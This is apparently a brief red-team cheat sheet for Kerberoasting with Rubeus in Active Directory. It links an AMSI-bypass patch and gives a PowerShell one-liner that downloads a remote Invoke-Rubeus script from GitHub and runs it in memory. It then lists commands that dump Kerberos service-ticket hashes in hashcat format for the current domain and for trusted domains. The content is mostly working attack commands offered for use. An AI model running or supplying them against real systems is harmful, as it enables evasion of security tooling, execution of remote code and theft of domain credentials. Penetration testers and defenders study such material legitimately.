# Reference
- [Rubeus](https://github.com/GhostPack/Rubeus)

# Add to PowerShell
- [Patch amsi.dll](https://github.com/okazymyrov/piki/blob/master/PowerShell.md#patching-amsidll-amsiscanbuffer-by-rasta-mouse)
```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/okazymyrov/piki/master/Invoke-Rubeus.ps1')
```

# Commands

## Kerberoast for the current domain
```powershell
Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat'
```

## Kerberoast for a trusted domain
```powershell
Invoke-Rubeus 'kerberoast /outfile:hashes.<domain>.txt /format:hashcat /domain:<trusted domain> /dc:<trusted DC>'
```
